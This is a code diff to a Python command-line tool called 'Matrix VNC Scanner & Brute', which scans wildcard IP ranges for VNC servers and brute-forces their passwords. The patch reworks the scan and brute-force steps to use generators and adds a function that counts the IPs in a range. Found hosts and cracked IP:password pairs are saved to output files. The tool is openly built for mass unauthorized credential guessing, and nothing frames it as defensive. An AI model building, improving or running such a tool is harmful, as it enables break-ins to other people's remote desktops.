@@ -27,6 +27,14 @@ def print_scan_header(ip_range, port, threads, total):
     )
     console.print(panel, justify=None)
 
+def count_ips_in_wildcard(wildcard: str):
+    parts = wildcard.split('.')
+    total = 1
+    for part in parts:
+        if part == '*':
+            total *= 256
+    return total
+
 def main():
     parser = argparse.ArgumentParser(description="Matrix VNC Scanner & Brute")
     parser.add_argument("--scan", action="store_true", help="Scan for VNC servers")
@@ -41,10 +49,14 @@ def main():
     matrix_banner()
     matrix_stream()
 
+    console = Console()
+
     if args.scan:
-        ip_list = ip_range_from_wildcard(args.range)
-        print_scan_header(args.range, args.port, args.threads, len(ip_list))
-        found = scan_range(ip_list, args.port, DEFAULT_CONFIG["scan_timeout"], args.threads)
+        console.print("[cyan]Preparing IPs...[/cyan]")
+        ip_gen = ip_range_from_wildcard(args.range)
+        total_ips = count_ips_in_wildcard(args.range)
+        print_scan_header(args.range, args.port, args.threads, total_ips)
+        found = scan_range(ip_gen, args.port, DEFAULT_CONFIG["scan_timeout"], args.threads)
         with open("output/ips.txt", "a") as f:
             for ip in found:
                 f.write(ip + "\n")
@@ -52,14 +64,18 @@ def main():
 
     if args.brute:
         print("Brute-forcing...")
-        with open("output/ips.txt") as f:
-            ips = [line.strip() for line in f if line.strip()]
+        def ip_gen():
+            with open("output/ips.txt") as f:
+                for line in f:
+                    ip = line.strip()
+                    if ip:
+                        yield ip
         # Prioritate: CLI > fisier > config
         if args.passwords:
             passwords = args.passwords
         else:
             passwords = load_passwords_from_file("input/passwords.txt") or DEFAULT_CONFIG["passwords"]
-        results = brute_force(ips, args.port, passwords, DEFAULT_CONFIG["brute_timeout"], DEFAULT_CONFIG["brute_threads"])
+        results = brute_force(ip_gen(), args.port, passwords, DEFAULT_CONFIG["brute_timeout"], DEFAULT_CONFIG["brute_threads"])
         with open("output/results.txt", "w") as f:
             for ip, pwd in results:
                 f.write(f"{ip}:{pwd}\n")
